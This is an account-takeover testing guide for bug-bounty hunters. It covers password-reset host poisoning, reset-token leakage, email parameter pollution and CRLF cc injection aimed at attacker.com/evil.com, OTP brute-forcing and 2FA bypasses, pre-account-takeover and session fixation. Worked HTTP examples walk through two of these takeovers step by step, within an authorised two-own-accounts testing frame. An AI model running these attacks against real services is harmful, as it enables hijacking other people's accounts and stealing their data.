# Account Takeover (ATO) — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Account Takeover — the **impact hub**: password-reset abuse · 2FA/MFA & OTP bypass · email-change & pre-account-takeover · session/token flaws · authz/IDOR-to-ATO · SSO/OAuth-to-ATO · injection-to-ATO chains.
**Impact ceiling:** **full takeover of any user's account (including admin) — the money bug** — via credential/session theft, reset-flow abuse, 2FA bypass, or account-linking; unauthenticated where the reset/register/SSO flows are pre-auth.
**Primary CWE:** CWE-640 (Weak Password Recovery) · CWE-287 (Improper Authentication) · CWE-384 (Session Fixation) · CWE-620 (Unverified Password Change) · CWE-307 (Excessive Auth Attempts / OTP brute) · CWE-639 (Authorization Bypass via User Key).

> ⚠️ **This is a methodology / impact kit, not a single bug class.** It ties the whole library together: chase the **takeover**, using whatever vector lands. It **owns** the flows that have no other kit (password reset, 2FA/OTP, email change, pre-ATO, session), and **cross-references** the class kits for the underlying bug: [../OAuth/](../OAuth/) (SSO/pre-ATO), [../JWT/](../JWT/) (token forgery), [../IDOR/](../IDOR/) (authz ATO), [../HostHeader/](../HostHeader/) (reset poisoning), [../CSRF/](../CSRF/), [../XSS/](../XSS/) (session theft), [../CORS/](../CORS/), [../WebCache/](../WebCache/) (deception → token theft), [../RaceCondition/](../RaceCondition/), [../SQLi/](../SQLi/) / [../NoSQLi/](../NoSQLi/) (auth bypass/dump).

---

## Read this first — why ATO is the bug everyone actually wants

> 🧭 **New to this? Start here.** **Account takeover (ATO)** means exactly what it sounds like: **you end up logged into someone else's account** — reading their messages, spending their money, changing their settings — without knowing their password the normal way. Think of an online account as a **locked apartment**. There are three ways in: the **front door** (you log in with the password + 2FA), the **spare key hidden for emergencies** (the "forgot password" / account-recovery flow), and the **wristband that says you already came in** (your session cookie/token — the thing that keeps you logged in as you click around). A burglar doesn't need all three; **any one weak entry point** gets them inside. ATO hunting is just checking each of those three entry points on *someone else's* apartment and finding the one the builder left sloppy. This whole guide is organized around those three doors — **who you prove you are, how you recover, how your session persists** — so if the jargon gets heavy, come back to the apartment.

Account takeover is the **outcome that pays**. A triager rates the *impact*, and "I can log into any user's account, including admin, without their password" is the top of almost every severity table. Most individual bugs on this program are only interesting **because they lead to ATO** — a reset-token leak, a missing rate-limit, an IDOR on the email field, an `alg:none` JWT. Your job is to **connect a primitive to a takeover** and prove it end-to-end.

**Why it pays High/Critical — every time:**
- **Direct, complete compromise of a victim's account** — their data, their money, their identity. Admin ATO = the whole app.
- **Often unauthenticated** — password-reset, registration, and SSO flows run before login, so the attacker needs nothing.
- **Chains everything** — XSS, CSRF, IDOR, SSRF, cache deception, Log4Shell all "cash out" as ATO. This kit is where they converge.
- **Low interaction** — many ATOs are 0-click (reset poisoning, pre-account-takeover) or 1-click (a reset link, an OAuth linking CSRF).

**Report the takeover, not the condition.** "The reset link contains the token in the `Referer`" is a *lead*. "I took over the victim's account by capturing their reset token from the `Referer` sent to my analytics domain, and logged in as them" is the finding. Always prove it with **two accounts you own** (attacker + victim) and show you ended up **inside the victim's account**.

**The one mental model.** An account is protected by three things: **who you prove you are** (login/2FA), **how you recover it** (reset/email-change), and **how the session persists** (tokens/cookies). ATO is breaking **any one** of those for **someone else's** account. Enumerate all three surfaces, attack the weakest, and prove cross-account.

*Why "the weakest of three" matters so much:* a bank can have a flawless login page and unbreakable 2FA, but if the "forgot password" flow emails the reset link to an address **you** control, none of the front-door strength helps — you walked in through the spare-key box. Defenders have to get **all three** doors right; you only have to find **one** that's wrong. That asymmetry is why ATO is so findable and so well-paid. So don't fixate on hammering the login form (the door everyone reinforces) — map all three surfaces first (§1) and spend your time on whichever one looks hand-built or under-checked.

---

## Master Testing Sequence — the testing order

> **This is the spine.** Register **two of your own accounts** first (attacker `A`, victim `B`) — every ATO proof is "as `A`, I took over `B`."

```
PHASE 0  MAP AUTH        → enumerate every auth flow: login · register · reset · email/phone-change · 2FA/OTP · SSO · session (§1)
PHASE 1  RESET  ⭐        → host/Referer poisoning · token leak · weak/reusable token · param pollution · CC injection (§2–§5)
PHASE 2  2FA/OTP  ⭐      → response manip · no-rate-limit brute · reuse · force-browse skip · disable-without-reauth (§6–§8)
PHASE 3  EMAIL/PRE-ATO ⭐ → email change w/o reauth · pre-account-takeover · email normalization/collision (§9–§10)
PHASE 4  SESSION/TOKEN   → fixation · no-rotate/no-invalidate · long-lived · remember-me · JWT (→ ../JWT/) (§11)
PHASE 5  AUTHZ + CHAINS  → IDOR on email/pass (→ ../IDOR/) · mass-assignment · SSO/OAuth (→ ../OAuth/) · XSS/CSRF/cache/JNDI (§12–§13)
PHASE 6  LOGIC/RESPONSE  → response boolean flip · step force-browse · parameter pollution (§14)
PHASE 7  VALIDATE→REPORT → FP filter (§15) · CVSS+CWE (§16) · playbooks (§17) ·
                           SAFE-PoC: TWO OWN accounts, prove cross-account, then STOP (§18) · dedup+report (§19)
```

**Phase-by-phase deliverable:**
1. **PHASE 0 — Map.** List every flow that authenticates, recovers, or changes account identity/session. *Deliverable:* the auth surface + two test accounts.
2. **PHASE 1 — Reset ⭐.** Break the password-reset flow (poison the link, leak/reuse/predict the token, pollute the email). *Deliverable:* a captured/forged reset for `B`.
3. **PHASE 2 — 2FA/OTP ⭐.** Bypass the second factor (response flip, brute a code with no rate-limit, force-browse past it). *Deliverable:* `B`'s account entered past 2FA.
4. **PHASE 3 — Email/pre-ATO ⭐.** Change identity without re-auth, or pre-register `B`'s email so their later SSO merges into your account. *Deliverable:* control of `B`'s identity.
5. **PHASE 4–6 — Session / authz / logic.** Fixation, non-rotating/non-expiring sessions, IDOR on email/password, response flips.
6. **PHASE 7 — Report.** FP filter, CVSS/CWE, safe PoC (two own accounts, prove you're **in** `B`), dedup, write it (§15–§19).

Reference anytime: payloads → `ACCOUNT_TAKEOVER_ARSENAL.md`; checklist → `ACCOUNT_TAKEOVER_CHECKLIST.md`; scripts → `poc/`; playbooks **§17**.

---

# PART I — MAP THE AUTH SURFACE

# 1. Enumerate every flow (each is an ATO surface)

```
LOGIN:        password login · SSO/social · magic-link · WebAuthn · "remember me" · device trust.
REGISTER:     signup · email/phone verification · invite/join-org · username/email uniqueness rules.
RECOVERY:     "forgot password" · "forgot username" · account-recovery questions · reset-via-SMS/email · support flow.
CHANGE:       change email · change phone · change password · change 2FA · deactivate/reactivate.
2FA/MFA:      TOTP · SMS/email OTP · backup codes · push · trusted-device · step-up auth for sensitive actions.
SESSION:      cookies/JWT · logout · "log out all devices" · concurrent sessions · token lifetime · rotation on login/priv-change.
LINK/MERGE:   link social account · merge duplicate accounts · add a second email.
```
For each, capture the **request/response**, note **what proves identity** and **what's missing** (re-auth? verification? rate-limit? token binding?). The gap is the ATO.
> **If this → then that:** a flow **changes email/password/2FA or issues a session** without **re-authenticating** or **verifying** → that's your first target. "Change email → then reset password to the new email" is the canonical two-step ATO; look for any change flow that skips re-auth.

---

# PART II — PASSWORD RESET ATTACKS (the flagship ATO surface)

# 2. Reset-link poisoning (0-click, unauthenticated)

The reset email's link is built from a **host** the app trusts from the request — poison it and the victim's click sends **you** the token.

> *In plain words — how this bug is even possible:* when you click "forgot password," the server generates a secret **reset token** (a long random string that proves "whoever holds this may set the new password") and emails you a link like `https://target.com/reset?token=ABC123`. To build that link, the server needs to know its own domain name — and lazy code grabs it from the **`Host` header of your request** instead of from a fixed config value. But **you** control the `Host` header (it's just text in the HTTP request). So you send the "reset password for **victim**" request with `Host: attacker.com`, and the server dutifully emails the *victim* a link like `https://attacker.com/reset?token=VICTIM_SECRET`. When the victim clicks it (they trust the email — it's a real reset they may have expected), their browser sends that secret token **to your server**. You now hold the victim's reset token → you set their password → you're in. It's **0-click for you** (the victim does the clicking) and needs **no login** (the reset flow is pre-auth) — which is why it's Critical. The header tricks below are just ways to smuggle your host past a picky server; see [../HostHeader/](../HostHeader/) for the full menu.

```
Host: attacker.com                         → link becomes https://attacker.com/reset?token=VICTIM_TOKEN
X-Forwarded-Host: attacker.com             → same, via the proxy header (see ../HostHeader/)
X-Forwarded-Host: attacker.com&x=          ·  X-Host: attacker.com  ·  X-Forwarded-Server: attacker.com
Host: target.com:@attacker.com  /  Host: target.com\n Host: attacker.com  (dual-host / CRLF)
Referer-based:  if the reset page loads attacker-controllable resources, the token leaks in the Referer.
```
Trigger a reset **for the victim** (`B`), poison the host, and catch the token on your server when `B` clicks (or when the app server-side-fetches your host). → **you hold `B`'s valid reset token → set their password → ATO.**
> **If this → then that:** the reset link in the email reflects your `Host`/`X-Forwarded-Host` → **0-click ATO via reset poisoning** (Critical) — cross-ref [../HostHeader/](../HostHeader/) for the header tricks. If only the *password-reset page* (not the email) is poisoned, the token can still leak via **`Referer`** to third-party scripts/images.

## 2.1 Fully worked example — reset poisoning → ATO, start to finish

> *In plain words:* the whole class on the wire, once, with two accounts you own (`A` = you, `B` = "victim"). Every value is benign; the moment you're inside `B`, you **stop and restore**. Follow it once and every host-header / Referer / `reset_url` variant reads as the same five moves.

**The setup:** you control a listener at `attacker.com` (a VPS, or an interactsh/Collaborator host — anything that logs inbound requests). `B` is your own second account with email `victim-B@example.com`. The invariant you're breaking: **only `B` should ever hold `B`'s reset token.**

**Step 1 — Trigger a reset *for `B`*, poisoning the host the link is built from (you, unauthenticated):**
```http
POST /api/password/forgot HTTP/2
Host: target.com
X-Forwarded-Host: attacker.com          ← the lie: middleware builds the link from this
Content-Type: application/json

{"email":"victim-B@example.com"}
```
```http
HTTP/2 200 OK
{"status":"if that account exists, a reset link has been sent"}
```
The generic response is deliberate (anti-enumeration) — it tells you nothing, which is *why* you prove impact by the token landing at your host, not by this body.

**Step 2 — What the server actually mailed to `B`.** The token is real and minted against `B`'s account; only the **host** is yours:
```
To: victim-B@example.com     Subject: Reset your password
Reset your password:  https://attacker.com/reset?token=b3F1c2R0a2Vu9aZ...   ← B's REAL token, on ATTACKER's host
```

**Step 3 — `B` clicks the link (a reset they may well have been expecting).** Their browser sends the token straight to **your** server — you never touched `B`:
```
[attacker.com listener]  GET /reset?token=b3F1c2R0a2Vu9aZ...  Host: attacker.com   src=<B's IP>
```
You now hold `B`'s valid reset token. *(Fully-0-click variants: if the reset **page** on `target.com` loads any attacker-influenced resource, the token leaks in the `Referer`; some mail clients pre-fetch links. Either way the token reaches you without `B` deciding to click.)*

**Step 4 — Consume `B`'s token on the *real* site and set a password you know:**
```http
POST /api/password/reset HTTP/2
Host: target.com
Content-Type: application/json

{"token":"b3F1c2R0a2Vu9aZ...","password":"AtoPoc-Marker-2026!"}
```
```http
HTTP/2 200 OK
{"status":"password updated"}
```

**Step 5 — Log in as `B` (the cross-account proof — this is the finding):**
```http
POST /api/login  {"email":"victim-B@example.com","password":"AtoPoc-Marker-2026!"}
→ HTTP/2 200 OK   Set-Cookie: session=<B's session>
GET /api/me  (with B's session)
→ {"id":40217,"email":"victim-B@example.com","name":"Test Victim B"}     ← you are inside B
```

**What each step proved, and where to stop:**
```
Step 1  poisoned reset     → the link host came from YOUR header, not the server config (the root cause)
Step 2  the email          → the token is B's, real, and points at attacker.com
Step 3  listener hit        → B's secret token arrived at YOUR server (0-click for you; restore-safe)
Step 4  password set        → you consumed B's token on the real origin
Step 5  logged in as B      → "as an unauthenticated attacker, I am inside B's account" = Critical ATO
```
> **Stop and restore.** Reading `B`'s own email back from `/api/me` is a complete proof; do not read `B`'s data further, and **restore `B`'s password** (you own `B`, so reset it back). Report it as **CWE-640, unauth 0-click, CVSS `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`** (UI:R because `B` clicks; the Referer/pre-fetch variant drops to `UI:N` → ~9.8). **Real-world:** this is the class James Kettle documented in *Practical HTTP Host Header Attacks* (2013, against Django/Gallery and others) and that PortSwigger's Academy still teaches — the mechanism has survived a decade because framework middleware keeps trusting `X-Forwarded-Host` (see the case studies before Part VIII).

# 3. Reset-token leakage

```
□ In the RESPONSE body/JSON of the "send reset" call (some APIs return the token/link).
□ In the Referer header sent to analytics/CDN/third-party when the reset page loads external resources.
□ In redirects / URL history / server logs / error pages.
□ Emailed link works but the token is ALSO returned to the browser (SPA leaks it).
□ Reset link with the token in the URL indexed/cached (../WebCache/ deception can lift it).
```
> **If this → then that:** the "forgot password" API **returns the token/link in its JSON** → immediate ATO for any email you submit (Critical, unauth). The token leaks in **`Referer`** → ATO for any victim whose reset page loads your resource.

# 4. Weak / mishandled reset tokens

> *In plain words:* the reset token is the master key to the account, so its **only** protection is being **impossible to guess**. "Entropy" is just the technical word for *how unguessable* it is — a 40-character string of true randomness has huge entropy (a lifetime of guessing won't crack it), while a token that's really `MD5(email)`, the current timestamp, or a number that ticks up by one each time (`1001`, `1002`, `1003`…) has *tiny* entropy: if you can figure out the recipe, you can **forge the victim's token without ever seeing it**. So the game here is: request a bunch of tokens for *your own* account, lay them side by side, and look for a pattern (do they share a prefix? go up by one? change only with the clock?). If you spot the recipe, you compute what the victim's token must be. The other failures below are about **lifetime and binding** — a token that never expires, can be used twice, isn't cancelled when the password changes, or (the juicy one) isn't actually tied to a specific user so you can pair *your* valid token with the *victim's* email.

```
□ PREDICTABLE: sequential, timestamp-based, short, MD5(email)/MD5(email+time), base64(userid+ts) → forge the victim's token.
□ NON-EXPIRING / long TTL → a leaked/old token still works.
□ NOT SINGLE-USE → reused after a successful reset.
□ NOT INVALIDATED on email change / password change / new reset request.
□ NOT BOUND to the user → use YOUR token to reset the VICTIM (submit your token + victim's id/email).
□ Token reflected then reused; token guessable via ../RaceCondition/ or brute (no rate-limit).
```
Use `poc/reset_token_analyzer.py` to collect many tokens for **your own** account and test entropy/sequential/timestamp structure.
> **If this → then that:** you collect 20 reset tokens for your own account and they're **sequential or timestamp-correlated** → you can **forge the victim's token** → ATO. Token still works after use/after a second request → session-independent replay.

# 5. Reset-flow parameter abuse

> *In plain words:* here you don't attack the token's strength — you trick the server into **mailing the victim's reset link to your address**. The classic is **HTTP Parameter Pollution (HPP)**: you send the email field **twice** — `email=victim@target.com&email=attacker@evil.com`. Buggy servers often **validate one copy but send the mail to the other**, so the token generated *for the victim's account* lands in *your* inbox. Same idea with **CRLF/CC injection** (sneak a newline + `cc:` so the mail gets a second recipient — you) and with a **`reset_url`/`callback`/`domain`** field in the JSON body that some APIs foolishly trust (point it at your host, exactly like the Host-poisoning in §2). **Email normalization** is the sneaky cousin: `Victim@target.com`, `victim@target.com.` (trailing dot), or a Unicode look-alike may be treated as "different" at registration but "the same" when routing the reset — letting you request a reset the app thinks is for a different address but delivers to the victim's mailbox (or yours). All roads lead to: **you receive a token minted for the victim's account.**

```
EMAIL PARAM POLLUTION (get the reset sent to YOU while it's for the VICTIM):
  email=victim@target.com&email=attacker@evil.com          (HPP — app validates one, mails the other)
  email[]=victim@target.com&email[]=attacker@evil.com      (array)
  {"email":["victim@target.com","attacker@evil.com"]}      (JSON array)
CC / SECOND-RECIPIENT injection:
  email=victim@target.com%0acc:attacker@evil.com           (CRLF adds a CC)
  email=victim@target.com%20attacker@evil.com  /  email=victim@target.com,attacker@evil.com
EMAIL NORMALIZATION / UNICODE (get a reset for the victim via a "different" address the app maps to theirs):
  victim@target.com  vs  Victim@target.com  vs  victim@target.com.  vs  victim+x@target.com  vs  unicode look-alikes.
HOST in the body/JSON:  some APIs take a "callback"/"reset_url"/"domain" field → point it at attacker.com.
STEP/RESPONSE MANIPULATION:  change "delivered":false→true, reuse another user's reset session, force-browse to set-password.
```
> **If this → then that:** the reset endpoint accepts **two email values** (HPP/array/CRLF) → the victim's token is mailed to **your** address → ATO. A **`reset_url`/`callback`** field in the JSON → point it at your host → token capture.

---

# PART III — 2FA / MFA & OTP BYPASS

# 6. Structural 2FA bypass (skip the factor entirely)

> *In plain words:* two-factor auth is supposed to be a **second locked door** after the password — even with the right password, you can't get in without also entering the one-time code. A "structural" bypass means the second door was never actually load-bearing: you **walk around it** instead of picking the lock. The two most common holes: **(1) force-browse** — the login already handed you a *logged-in session cookie* after the password step, *before* checking the code, so you just navigate straight to the account page and ignore the "enter your code" screen entirely (the code check was only a UI speed-bump). **(2) response flip** — the app asks *your own browser* "is 2FA satisfied?" and trusts the answer; the verify response says `{"verified":false}` and the client obeys it, so you intercept and change it to `true`. Also always try the **API/mobile login path**: teams often bolt 2FA onto the website but forget the app's API endpoint, so logging in there skips it. The theme: the second factor only counts if the **server** refuses to issue a real session until the code is verified — anywhere it doesn't, the door is decorative.

```
□ FORCE-BROWSE: after password step, navigate straight to the post-login/authenticated endpoint, skipping the 2FA page.
□ RESPONSE MANIPULATION: the 2FA verify returns {"2fa":false}/{"verified":false} → flip to true; or the login returns a
  session BEFORE 2FA is checked.
□ BACKUP/RECOVERY path weaker than 2FA (recovery code brute, "lost device" bypass, email-OTP fallback).
□ 2FA disabled WITHOUT re-auth/OTP → turn it off on the victim's account (after another primitive) then log in.
□ 2FA not enforced on ALL entry points (API, mobile endpoint, legacy login, SSO) → use the one that doesn't ask.
□ TOKEN issued pre-2FA is already valid for sensitive actions.
```
> **If this → then that:** the password step returns a **usable session cookie before 2FA** → force-browse past the OTP page = **2FA bypass**. The verify response is a client-checked boolean → **flip it**. Always test the **API/mobile** login path — 2FA is often only enforced on the web UI.

# 7. OTP brute-force & weakness

> *In plain words:* a one-time code (the 4–6 digit number texted/emailed to you) is only safe because you get **a handful of tries** before you're locked out — 5 guesses against a million possibilities is hopeless for an attacker. This section is about all the ways that "handful of tries" fails. The headline is **no rate-limit**: if the server lets you submit *unlimited* wrong codes, a 6-digit code (1,000,000 options) falls to an automated script, and a 4-digit one (10,000) falls in seconds — the second factor is gone. Sneaky variants: the counter **resets when you request a fresh code** (so re-request every few guesses), it's counted **per-code instead of per-account**, or you dodge it by rotating the `X-Forwarded-For` header / changing letter-casing / adding a trailing space so the server thinks each attempt is a new client. Then there are code-quality bugs: the OTP is **reused/predictable**, **leaked in the response**, or the server accepts **`0000`/empty/`true`/an array** (type-juggling). You prove the rate-limit gap **safely** by firing a *bounded* batch of wrong codes at **your own** account and showing you're never blocked (`poc/otp_bruteforce.py`) — you never actually crack a real user's code (§18).

```
□ NO RATE-LIMIT on the OTP verify → brute a 4–6 digit code (10k–1M space) → bypass. (poc/otp_bruteforce.py detects the gap.)
□ RATE-LIMIT resettable: re-request the OTP resets the counter; or per-code not per-session; or bypass via
  X-Forwarded-For rotation / casing / trailing space / new session per attempt.
□ OTP NOT INVALIDATED after use / after expiry → replay.
□ OTP REUSED across requests/users; SAME OTP each time; predictable (timestamp/sequential).
□ OTP LEAKED in the response (some APIs return it) or sent to an attacker-changed phone/email.
□ NULL/EMPTY/0000/"000000"/leading-zero/negative/array OTP accepted; type-juggling (otp=true, otp=[correct]).
□ RACE on OTP verify (../RaceCondition/) — many parallel guesses before the limiter engages.
```
> **If this → then that:** you send 50 wrong OTPs to **your own** account and never get blocked → **no rate-limit → OTP brute-forceable → ATO** (Critical). Re-requesting the code resets the attempt counter → still brute-forceable. The response contains the OTP → instant bypass.

# 8. OTP / 2FA delivery abuse

```
□ Change the victim's phone/email (no re-auth) → OTP now goes to YOU (chains with §9).
□ Response discloses the OTP or the masked phone/email helps enumerate.
□ Downgrade to a weaker factor (SMS instead of TOTP) or a "trust this device" token that's forgeable/permanent.
□ Trusted-device / "remember me" cookie predictable, not bound to the device, or never expires.
```

---

# PART IV — EMAIL CHANGE, REGISTRATION & PRE-ACCOUNT-TAKEOVER

# 9. Email / identity change without re-auth or verification

```
□ Change email WITHOUT the current password / without OTP → set victim's account email to yours, then reset. (needs another primitive to reach their session, or an IDOR §12)
□ Change email and it takes effect BEFORE the new address is verified → attacker email active immediately.
□ No notification/confirmation to the OLD email → silent takeover.
□ Response manipulation on the change-email/verify step.
□ Change email to the VICTIM'S (see pre-ATO §10) to collide accounts.
```
> **If this → then that:** the change-email flow needs **no re-auth and no new-address verification** → combined with any read of the victim's session (XSS/cache/IDOR) it's **1-step ATO**; even alone it's a broken-flow finding. "Change email → reset password to it" is the canonical chain.

# 10. Registration abuse & pre-account-takeover (the quiet money bug)

> *In plain words — the bug most hunters walk past:* normally you take over an account that **already exists**. Pre-account-takeover flips the timeline: you **claim the victim's account before they do**, then wait for them to walk into it. Step by step: **(1)** You sign up on the site using the **victim's** email address (`victim@company.com`) and *your own* password. Many sites let you register without proving you own that email, or don't strictly enforce verification — so your half-baked account now "owns" their email. **(2)** Later, the real victim shows up and signs in with **"Sign in with Google"** (or any SSO). The site sees the email `victim@company.com` already has an account and **merges the Google login into your pre-existing account** instead of making a clean new one. **(3)** The victim is now using an account that **you also have the password to** — you log in whenever you like and read everything they do. It's **0-click for the victim** (they did nothing wrong; they just used SSO) and it's *invisible* because there's no "reset" or "hijack" event to alert anyone. The analogy: you filed the paperwork claiming their new house before they moved in, so your key still works after they get theirs. The test is one line — *"register the victim's email, then log in as the victim via SSO and see if I land in the account I made."* This is a classic High/Critical that programs pay well for (USENIX 2022 research, §Appendix C).

```
PRE-ACCOUNT-TAKEOVER (classic):
  1) Attacker registers an account using the VICTIM's email (email unverified / verification not enforced).
  2) Victim later signs up — often via SSO ("Sign in with Google") — and the app MERGES/links into the attacker's
     pre-existing account instead of creating a fresh one.
  3) Attacker still knows their password → shares the account → reads the victim's data. (cross-ref ../OAuth/ unverified-email linking)
CLASSIC merge/overwrite:
  □ Registering an existing email OVERWRITES / links the existing account.
  □ Username/email COLLISION via normalization: victim@x.com vs Victim@x.com vs victim@x.com. vs victim+@x.com vs unicode.
  □ Case/whitespace/dot/unicode-normalization mismatch between register and login/reset → two "different" strings, one account.
  □ Invite/join-org flows that trust an attacker-supplied email/role.
```
> **If this → then that:** you can **register the victim's email unverified** and later their **SSO login lands in your account** → **pre-account-takeover** (High/Critical, 0-click for the victim). This is the bug most programs pay well for and most hunters miss — always test "register victim's email, then SSO as victim."

## 10.1 Fully worked example — pre-account-takeover (the "classic-federated merge"), start to finish

> *In plain words:* §2 attacked an account that *exists*; this attacks one **before it exists** — you claim `B`'s identity, then wait for `B` to walk into the account you already control. It's invisible (no reset, no hijack event to alert anyone) and 0-click for the victim. Use your own second email as "`B`".

**Step 1 — Claim `B`'s email now, with a password *you* choose (verification not enforced):**
```http
POST /api/register HTTP/2
Host: target.com
Content-Type: application/json

{"email":"victim-B@example.com","password":"Attacker-Knows-This-1!"}
```
```http
HTTP/2 201 Created
{"id":88102,"email":"victim-B@example.com","email_verified":false}   ← a half-account EXISTS, unverified, and it's yours
```
Many apps let you sit here indefinitely: the account is created and "owns" the email, they just nag you to verify. (If the app *does* require verification to finish, look for a variant: an unverified account that still *reserves* the email, or an invite/join-org flow that trusts an attacker-supplied email.)

**Step 2 — Wait. You do nothing to `B`.** (This is what makes it 0-click and silent.)

**Step 3 — `B` later signs up the "normal" way — via SSO.** `B` clicks *Sign in with Google*; Google asserts the verified identity `victim-B@example.com` back to the app:
```
Google → target.com:   id_token { email: "victim-B@example.com", email_verified: true, sub: "google-oauth2|B" }
```
The app sees that email **already has an account** (yours, from Step 1) and — the vulnerable behaviour — **merges/links the Google identity into your pre-existing record** instead of creating a fresh, separate account. `B` is now inside the account whose password *you* set.

**Step 4 — Log in as `B` anytime, with the password from Step 1 (cross-account proof):**
```http
POST /api/login  {"email":"victim-B@example.com","password":"Attacker-Knows-This-1!"}
→ HTTP/2 200 OK   Set-Cookie: session=<B's session>
GET /api/me  → {"email":"victim-B@example.com","org":"B's company","documents":[...]}    ← shared account: you + B
```
`B` uses SSO and never sees a password prompt, so they never notice you also hold a password to the same account. You read their data whenever you like.

**What each step proved, and where to stop:**
```
Step 1  register B's email → the app let an UNVERIFIED account claim an identity you don't own (the root cause)
Step 3  B's SSO merge       → the federated login joined YOUR record instead of a fresh one (the vulnerable merge)
Step 4  login as B          → "I share B's account and hold a password to it" = pre-account-takeover, High/Critical
```
> **Stop and restore.** Confirm the merge with one `/api/me` read, then delete your pre-registered account so `B` isn't left sharing it. **Real-world:** this is the *Classic-Federated Merge* from Sudhodanan & Paverd (Microsoft), **"Pre-hijacking Attacks on Web User Accounts," USENIX Security 2022** — they found **35 of 75** popular services vulnerable to at least one of five pre-hijack variants. The one-line test that finds it: *register the victim's email, then SSO in as the victim and see whose account you land in.* Cross-ref [../OAuth/](../OAuth/) for the unverified-email linking mechanics.

---

# PART V — SESSION & TOKEN ATTACKS

# 11. Session/token lifecycle flaws

> *In plain words:* the **session token** is that "wristband" from the intro — the cookie your browser shows on every request so the server keeps treating you as logged-in. This section is about wristbands handed out or recycled carelessly. **Session fixation** is the counter-intuitive star: instead of *stealing* the victim's wristband, you **give them one you already hold a copy of**. You obtain a session id, plant it in the victim's browser (via a URL or cookie the app accepts), and wait for them to log in. If the app **doesn't issue a fresh id at login** — it just "upgrades" the one they already had to logged-in — then the id *you* planted is now an *authenticated* session for *their* account, and you're wearing the matching wristband. The other flaws are lifecycle sloppiness: sessions that **never expire**, **don't get replaced** when privileges change, or — the one that turns every session-theft bug permanent — **stay valid even after the user logs out or changes their password**. That last one means once you've grabbed a session (by any means), the victim *can't evict you* by doing the obvious thing. (`JWT` tokens have their own forgery angles — see [../JWT/](../JWT/).)

```
□ SESSION FIXATION: the app accepts a session id you set (URL/cookie) and doesn't rotate it on login → set B's session to a
  value you know, get B to authenticate, you share the authenticated session. (CWE-384)
□ NO ROTATION on login / privilege change → a pre-auth token stays valid post-auth.
□ NO INVALIDATION on logout / password change / email change → a stolen/old session survives the "fix". (CWE-613)
□ LONG-LIVED / non-expiring tokens; "remember me" that never dies or is predictable.
□ SESSION token in the URL (leaks via Referer/logs/history).
□ JWT: alg:none / weak secret / kid injection / no expiry → forge B's token (→ ../JWT/).
□ Concurrent-session abuse; "log out all devices" doesn't actually revoke.
```
> **If this → then that:** the session id **doesn't change after login** → **session fixation ATO** (seed B's session, they log in, you're in). The session **survives a password change** → a stolen session can't be evicted → escalates any session-theft bug to durable ATO.

---

# PART VI — AUTHZ & INJECTION CHAINS TO ATO (the cross-reference hub)

# 12. Broken authorization → ATO (IDOR / mass-assignment)

> *In plain words:* here you're logged into **your own** account, but the app lets you **reach into someone else's**. An **IDOR** (Insecure Direct Object Reference) is when a request says *which* account to act on via an id you can just change — e.g. `POST /api/user/1337/email`. Swap `1337` for the victim's id and, if the server doesn't check "wait, is this *your* account?", you've changed the **victim's** email — then you reset the password to the new address and you're in. **Mass assignment** is the sibling: a "update my profile" endpoint blindly accepts whatever fields you send, so you slip in `"role":"admin"` or `"email":"..."` or `"2fa_enabled":false` and the app happily writes them. Both come down to the same missing check — **object-level authorization**, i.e. "does this user own the thing they're trying to change?" Test it by doing an account-change with your two accounts and swapping the id/fields; this is one of the **most common real-world ATOs**, so check *every* "update account" call. (Deep dive: [../IDOR/](../IDOR/).)

```
□ IDOR on the change-email / change-password / change-phone endpoint (userId/accountId in path/body) → change B's creds as A.
  → cross-ref ../IDOR/ ; this is one of the most common real ATOs.
□ MASS ASSIGNMENT: a profile-update endpoint accepts email/role/isAdmin/2fa_enabled → overwrite B's email or grant yourself admin.
□ Password-change endpoint that doesn't check the OLD password AND lets you set the target user.
□ GraphQL/REST mutation exposing updateUser(id,email) without object-level authz (../GraphQL/, ../REST/).
```
> **If this → then that:** `POST /api/user/{id}/email` (or a body `userId`) lets account `A` change account `B`'s email → **direct ATO via IDOR** (Critical) → then reset to the new email. Test every "update account" call for **object-level authz** with your two accounts.

# 13. Injection / client-side / infra chains → ATO

> *In plain words — this is the "cash register" of the whole library:* lots of other bugs are only worth real money **because they end in ATO**, and this is where you convert them. Think of each bug class below as a *tool that steals a piece of the victim's identity*, and ATO as *what you do with it*. Found **XSS**? Run JavaScript in the victim's page → grab their session cookie → become them. Found **CSRF** on the change-email form? Make the victim's own browser silently change their email to yours → reset → in. Found permissive **CORS**? Read the victim's authenticated data (their token, their email) from another site → in. **Cache deception** lifts their logged-in page (with secrets) out of a shared cache. **SSRF/Log4Shell** can reach server secrets and forge any session. **SQLi/NoSQLi** can dump the password-hash / reset-token table or bypass the login check outright. The mindset shift for a beginner: don't stop at "I found an XSS" (a Medium) — **drive it to "I logged in as another user"** (a Critical). Same bug, several times the bounty. Each arrow points at the kit that owns the underlying technique.

```
XSS (../XSS/)              → steal B's session cookie / act in their session / change their email → ATO.
CSRF (../CSRF/)            → force B to change their email/password/2FA (no anti-CSRF on the sensitive action) → ATO.
CORS (../CORS/)            → read B's authenticated responses (token/CSRF/email) cross-origin → ATO.
Cache deception (../WebCache/) → lift B's authenticated page/token from the cache → ATO.
SSRF/Log4Shell (../SSRF/, ../JNDI/) → RCE/secret access → forge any session → ATO.
SQLi/NoSQLi (../SQLi/, ../NoSQLi/) → auth bypass / dump password hashes/reset tokens → ATO.
OAuth/SSO (../OAuth/)      → redirect_uri/code theft, state-CSRF account-linking, id_token forgery, pre-ATO → ATO.
Race (../RaceCondition/)   → parallel OTP/reset/coupon → bypass single-use limits → ATO.
```
> **If this → then that:** you have *any* of these primitives → **cash it out as ATO** here. A reflected XSS on the authenticated origin → cookie theft → login as B. A CORS `*`+credentials on `/api/me` → read B's token. Always drive the primitive to the takeover for maximum bounty.

---

# PART VII — LOGIC & RESPONSE MANIPULATION

# 14. Response/request tampering & flow logic

```
□ RESPONSE BOOLEAN FLIP: {"success":false}→true, {"2fa_required":true}→false, {"role":"user"}→"admin" on a client-trusted step.
□ FORCE-BROWSE past steps: skip email-verify / 2FA / "confirm identity" and hit the final authenticated endpoint directly.
□ HTTP PARAMETER POLLUTION on user/email/id fields (§5) across the auth flows.
□ MASS ASSIGNMENT of email_verified:true / is_admin:true / phone_verified:true on register/update.
□ STATUS-CODE reliance: the client treats 200 as success — replay a step and change the outcome.
□ REPLAY: reuse a one-time token/OTP/magic-link; use a step's token out of order or for another user.
```
